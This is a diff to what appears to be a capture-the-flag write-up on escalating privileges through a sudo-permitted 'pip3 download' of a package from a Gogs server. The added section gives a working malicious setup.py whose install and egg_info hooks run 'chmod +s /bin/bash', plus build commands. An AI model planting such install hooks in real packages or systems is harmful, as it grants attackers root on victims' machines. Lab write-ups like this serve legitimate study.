@@ -167,4 +167,47 @@ Checking sudo permission shows that the user can run `/usr/bin/pip3 download htt
 
 Remember that the service running on port 3000 is Gogs
 
+After searching for privilege escalation with *pip download* i found this [article](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)
+
+I downloaded the repo and modified the setup.py file to make */bin/bash* suid
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ee0c4319-769b-467f-801f-8aa665b22f40)
+
+```python
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+from setuptools.command.egg_info import egg_info
+import os
+
+def RunCommand():
+    os.system("chmod +s /bin/bash")
+
+class RunEggInfoCommand(egg_info):
+    def run(self):
+        RunCommand()
+        egg_info.run(self)
+
+class RunInstallCommand(install):
+    def run(self):
+        RunCommand()
+        install.run(self)
+
+setup(
+    name = "this_is_fine_wuzzi",
+    version = "0.0.1",
+    license = "MIT",
+    packages=find_packages(),
+    cmdclass={
+        'install' : RunInstallCommand,
+        'egg_info': RunEggInfoCommand
+    },
+)
+```
+
+Now I will create the .tar.gz file that will be the one to be uploaded to the repository on Gogs.
+![Uploading image.png…]()
+
+```bash
+pip install build --break-system-packages
+python3 -m build
+```
 
